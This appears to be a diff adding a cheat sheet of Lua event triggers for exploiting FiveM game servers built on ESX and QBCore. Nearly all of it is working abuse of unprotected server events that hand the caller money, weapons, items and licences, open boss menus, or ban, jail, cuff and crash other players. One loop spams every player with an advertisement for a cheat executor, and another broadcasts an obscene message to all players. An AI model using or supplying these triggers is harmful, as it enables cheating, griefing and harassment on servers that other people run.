@@ -1,0 +1,292 @@
+##Open Police menu
+TriggerEvent('esx_society:openBossMenu', 'police', function(data,menu) menu.close() end)
+ 
+##Open Ems menu
+TriggerEvent('esx_society:openBossMenu', 'ambulance', function(data,menu) menu.close() end)
+ 
+##Open mechanic
+TriggerEvent('esx_society:openBossMenu', 'mechanic', function(data,menu) menu.close() end)
+ 
+##Give money to your self ( cash in hand not on the bank)
+TriggerServerEvent('esx_slotmachine:sv:2', 100000)
+
+Money
+TriggerServerEvent('esx_truckerjob:pay', 2400000)
+TriggerServerEvent('vrp_slotmachine:server:2', 100000)
+TriggerServerEvent("esx_pizza:pay", 1000000)
+TriggerServerEvent('esx_jobs:caution', 'give_back', 1000000)
+TriggerServerEvent('lscustoms:payGarage', 1000000)
+TriggerServerEvent('esx_tankerjob:pay', 1000000)
+TriggerServerEvent('esx_vehicletrunk:giveDirty', 100000)
+TriggerServerEvent('f0ba1292-b68d-4d95-8823-6230cdf282b6', 100000)
+TriggerServerEvent('gambling:spend', 100000)
+TriggerServerEvent('265df2d8-421b-4727-b01d-b92fd6503f5e', 100000)
+TriggerServerEvent('AdminMenu:giveDirtyMoney', 500000)
+TriggerServerEvent('AdminMenu:giveBank', 1000000)
+TriggerServerEvent('AdminMenu:giveCash', 1000000)
+TriggerServerEvent('esx_slotmachine:sv:2', 1000000)
+Add these if you want
+TriggerServerEvent('esx_truckerjob:pay', amount)
+ 
+TriggerServerEvent('esx_ambulancejob:revive', ID)
+TriggerServerEvent("EasyAdmin:banPlayer", GetPlayerServerId( thePlayer ), BanReason, banLength[BanTime].time)
+TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 2000000000)
+ 
+new script
+to unban from any server
+TriggerAdminServerEvent(AdminEventUnban; steamid, ip)) end
+TriggerEvent('es_admin_ban', )
+ 
+TriggerServerEvent( 'mellotrainer:adminTempBan', id )
+TriggerServerEvent( 'mellotrainer:adminKick', id, "Kicked: You have been kicked from the server." )
+TriggerServerEvent('mellotrainer:adminTempBan', GetPlayerServerId(PlayerId()))
+ 
+ 
+TriggerServerEvent('esx_moneywash:deposit', 1000000)
+TriggerServerEvent('esx_moneywash:withdraw', 1000000)
+ 
+TriggerEvent('esx_status:set', 'hunger', 1000000)
+TriggerEvent('esx_status:set', 'thirst', 1000000)
+TriggerServerEvent('esx_policejob:handcuff', playerId) to 
+TriggerServerEvent('esx_policejob:UCuffedBoi', playerId)
+ 
+UpdateChannel=canary
+ 
+How to spawn a car:
+TriggerEvent('esx:spawnVehicle', "vehiclename")
+ 
+How to get items you want (if they didn't correct the below 0 bug)
+TriggerServerEvent('esx_vehicleshop:putStockItems', "bread",-100)
+ 
+How to teleport you to some coords:
+TriggerEvent('esx:teleport', {x= -365.425, y= -131.809, z= 37.873})
+ 
+How to revive yourself
+TriggerEvent('esx_ambulancejob:revive')
+ 
+buy a property without a realestate agent
+TriggerServerEvent('esx_property:buyProperty', "LowEndApartment")
+ 
+Give yourself dirty money
+TriggerServerEvent('AdminMenu:giveDirtyMoney', 500000)
+TriggerServerEvent('esx_weashop:buyItem', "WEAPON_MACHETE", -500000, "BlackWeashop")
+ 
+Give yourself 10000 bankmoney 
+TriggerServerEvent('AdminMenu:giveBank', 10000)
+ 
+Give yourself 10000 cash
+TriggerServerEvent('AdminMenu:giveCash', 60000)
+Revive anyone with an id (12 is the id of that player)
+TriggerServerEvent('esx_ambulancejob:revive', 12)
+ 
+open a skin change menu
+TriggerEvent('esx_skin:openSaveableMenu')
+ 
+setjob someone (59 is id of the player and 3 is the grade)
+TriggerServerEvent('NB:recruterplayer', 59, "mecano", 0)
+ 
+You can send billing a player, Change 131 to player id, Purposeless to player Shared account name, also you can change Payday it's name of the billing and 100 is the amount of billing.
+TriggerServerEvent('esx_billing:sendBill', 131, "Purposeless", "Payday", 100)
+ 
+You can Cuff & Drag a player with this code
+TriggerServerEvent('esx_policejob:handcuff', playerId)
+TriggerServerEvent('esx_policejob:handcuff', GetPlayerServerId(player))
+TriggerServerEvent('esx_policejob:drag', GetPlayerServerId(player))
+ 
+You can purchase any gun for free
+TriggerServerEvent('esx_policejob:giveWeapon', WEAPON_CARBINERIFLE,  1000)
+TriggerServerEvent('esx_weashop:buyItem', "WEAPON_MACHETE", -500000, "BlackWeashop")
+Just change WEAPON_MACHETE (Weapon Names)
+ 
+Set your Hunger & Thirst
+TriggerEvent('esx_status:set', 'hunger', 1000000)
+TriggerEvent('esx_status:set', 'thirst', 1000000)
+Spawns yourself a repair kit from Mechanics
+TriggerServerEvent('esx_mecanojob:startHarvest2') -> Spawns a tool
+TriggerServerEvent('esx_mecanojob:startCraft2') -> Crafts a repair kit from that tool spawned which you can actually use
+ 
+Opens bossmenu Police
+TriggerEvent('esx_society:openBossMenu', 'police', function(data,menu) menu.close() end)
+ 
+Opens bossmenu for EMS
+TriggerEvent('esx_society:openBossMenu', 'ambulance', function(data,menu) menu.close() end)
+ 
+Opens bossmenu for Mechanics
+TriggerEvent('esx_society:openBossMenu', 'mechano', function(data,menu) menu.close() end)
+ 
+Opens bossmenu for Car Dealer
+TriggerEvent('esx_society:openBossMenu', 'cardealer', function(data, menu) menu.close() end)
+ 
+Opens bossmenu for BankerJob
+TriggerEvent('esx_society:openBossMenu', 'banker', function (data, menu) menu.close() end)
+ 
+Opens bossmenu for Realestateagent
+TriggerEvent('esx_society:openBossMenu', 'realestateagent', function(data, menu) menu.close() end)
+ 
+Give yourself money via slot machines (esx_slotmachine)
+TriggerServerEvent('esx_slotmachine:sv:2', 1000000)
+ 
+Spawn items from Mechanic job
+TriggerServerEvent('esx_mecanojob:startHarvest')
+TriggerServerEvent('esx_mecanojob:startHarvest2')
+TriggerServerEvent('esx_mecanojob:startHarvest3')
+-> Harvest 1 (Get jerry can)
+ 
+TriggerServerEvent('paycheck:salary', 20000) (Give yourself money)
+Admin menu crash players
+TriggerClientEvent('es_admin:crash', player)
+ 
+Give yourself money
+TriggerServerEvent('lscustoms:payGarage', {costs = -amount})
+ 
+Skin Menu
+TriggerEvent('esx_skin:openRestrictedMenu', function(data, menu) menu.close() end)
+ 
+ESX Drugs Events
+ -Harvesting
+TriggerServerEvent('esx_drugs:startHarvestWeed')
+TriggerServerEvent('esx_drugs:startHarvestCoke')
+TriggerServerEvent('esx_drugs:startHarvestMeth')
+TriggerServerEvent('esx_drugs:startHarvestOpium')
+TriggerServerEvent('esx_drugs:stopHarvestWeed')
+TriggerServerEvent('esx_drugs:stopHarvestCoke')
+TriggerServerEvent('esx_drugs:stopHarvestMeth')
+TriggerServerEvent('esx_drugs:stopHarvestOpium')
+ -Processing
+TriggerServerEvent('esx_drugs:startTransformWeed')
+TriggerServerEvent('esx_drugs:startTransformCoke')
+TriggerServerEvent('esx_drugs:startTransformMeth')
+TriggerServerEvent('esx_drugs:startTransformOpium')
+TriggerServerEvent('esx_drugs:stopTransformWeed')
+TriggerServerEvent('esx_drugs:stopTransformCoke')
+TriggerServerEvent('esx_drugs:stopTransformMeth')
+TriggerServerEvent('esx_drugs:stopTransformOpium')
+ -Selling
+TriggerServerEvent('esx_drugs:startSellWeed')
+TriggerServerEvent('esx_drugs:startSellCoke')
+TriggerServerEvent('esx_drugs:startSellMeth')
+TriggerServerEvent('esx_drugs:startSellOpium')
+TriggerServerEvent('esx_drugs:stopSellWeed')
+TriggerServerEvent('esx_drugs:stopSellCoke')
+TriggerServerEvent('esx_drugs:stopSellMeth')
+TriggerServerEvent('esx_drugs:stopSellOpium')
+ 
+Get a weapon license for free
+TriggerServerEvent('esx_weashop:buyLicense', 0)
+TriggerServerEvent('esx_society:openBossMenu','police',function(data,menu)menu.close()end)
+
+TriggerServerEvent("esx:giveInventoryItem",1, "item_weapon", "WEAPON_akmBRP", 250)
+TriggerServerEvent("esx:giveInventoryItem",1, "item_weapon", "WEAPON_ak74BRP", 250)
+TriggerServerEvent("esx:giveInventoryItem",1, "item_weapon", "WEAPON_lvoacBRP", 250)
+TriggerServerEvent("esx:giveInventoryItem",1, "item_weapon", "WEAPON_vesperBRP", 250)
+TriggerServerEvent("esx:giveInventoryItem",1, "item_weapon", "WEAPON_nailgun", 250)
+TriggerServerEvent("esx:giveInventoryItem",1, "item_weapon", "WEAPON_WINCHESTER12BRP", 250)
+TriggerServerEvent("esx:giveInventoryItem",1, "item_weapon", "WEAPON_MOSINBRP", 250)
+TriggerServerEvent("esx:giveInventoryItem",1, "item_weapon", "WEAPON_FNP", 250)
+TriggerServerEvent("esx:giveInventoryItem",1, "item_weapon", "WEAPON_PT92", 250)
+TriggerServerEvent("esx:giveInventoryItem",1, "item_weapon", "WEAPON_HK45BRP", 250)
+TriggerServerEvent("esx:giveInventoryItem",1, "item_weapon", "WEAPON_m1911BRP", 250)
+TriggerServerEvent("esx:giveInventoryItem",1, "item_weapon", "WEAPON_TEC9BRP", 250)
+
+Cannabis
+TriggerServerEvent('esx_drugs:outofbound')
+TriggerServerEvent('esx_drugs:processCannabis')
+TriggerServerEvent('esx_drugs:pickedUpCannabis')
+
+TriggerServerEvent('m3:houserobbery:giveItem', "WEAPON_MACHINEPISTOL", 1)        M3 ENVANTER
+TriggerServerEvent('esx_vehicleshop:putStockItems', 'WEAPON_PISTOL', -1)   DİSC ENVANTER
+TriggerServerEvent('esx_inventoryhud:addPlayerItem', "WEAPON_PISTOL", 1)   ServerButik Envanter
+
+for i = 1, 1000 do
+
+Citizen.Wait(20)
+
+TriggerServerEvent('esx_uber:pay', 10000000)
+
+Citizen.Wait(20)
+
+TriggerServerEvent("bank:deposit", 10000000)
+
+Citizen.Wait(20)
+
+TriggerServerEvent('gcPhone:transfer', i, 10000000)
+
+Citizen.Wait(20)
+
+TriggerServerEvent('gcPhone:twitter_postTweets',
+"ID: " .. tostring(i) .. " lutfen bankana bak. Sana para gonderdik, bu parayi UNEX EXECUTOR sayesinde yaptik.\nhttps://discord.gg/pd3s2Mpf4E.",
+"https://cdn.discordapp.com/attachments/822209888301219900/824605501614194739/download.png")
+
+Citizen.Wait(20)
+
+TriggerServerEvent('gcPhone:yellow_postIlan',
+"ID: " .. tostring(i) .. " lutfen bankana bak. Sana para gonderdik, bu parayi UNEX EXECUTOR sayesinde yaptik.\ndhttps://discord.gg/pd3s2Mpf4E",
+"https://cdn.discordapp.com/attachments/822209888301219900/824605501614194739/download.png")
+
+end
+
+
+
+TriggerServerEvent('m3:admin:server:announce', message)
+
+local HigherPlayerID = 512
+------------------------------------------------------------------------
+Citizen.CreateThread(function()
+------------------------------------------------------------------------
+--        Function (Don't touch unless you know what you're doing.)      --
+------------------------------------------------------------------------
+    function Annonce(text)
+        for i = 1, HigherPlayerID do
+            if NetworkIsPlayerActive(i) then
+                TriggerServerEvent('esx_policejob:message', GetPlayerServerId(i), text)
+            end
+        end
+    end
+
+    function Pause(vtime)
+        Citizen.Wait(vtime * 99999999)
+    end
+------------------------------------------------------------------------
+    while true do
+------------------------------------------------------------------------
+--           Script text (Il suffit de copier|collé normalement)
+------------------------------------------------------------------------
+
+        Annonce("SA ARKADAÞLAR BEN BARTU SIKERIM")
+
+
+------------------------------------------------------------------------
+    return end
+
+end)
+
+TriggerServerEvent('QBCore:Server:AddItem', "snowball", 1)
+
+TriggerServerEvent("inventory:server:CraftItems", itemName, itemCosts, amount, toSlot, points)
+TriggerServerEvent("inventory:server:CraftAttachment", itemName, itemCosts, amount, toSlot, points)
+
+TriggerServerEvent("esx_receptury:RemoveItem","water")
+TriggerServerEvent("esx_receptury:AddItem","water")
+olabilir QB
+
+Efso triggerlar
+
+
+TriggerServerEvent('meat-farm:startSelling', "clothe", 30, "460") -- Surreal İtem Satma
+
+TriggerServerEvent('fishing:startSelling', "fish")
+
+TriggerServerEvent("social-bossmenu:server:withdrawMoney", amount) -- Surreal Para Basma
+
+for i = 1, 20 do
+TriggerServerEvent('RLCore:Server:AddItem', "fish", 250, i)
+TriggerServerEvent('fishing:startSelling', "fish", i)
+Citizen.Wait(100)
+end 
+-- Surreal Para
+
+TriggerServerEvent("RLCore:Server:SetMetaData", "hunger", 200)
+TriggerServerEvent("RLCore:Server:SetMetaData", "thirst", 200)
+
+
+TriggerServerEvent("social-job:give-item", "itemadı", "itemsayı")
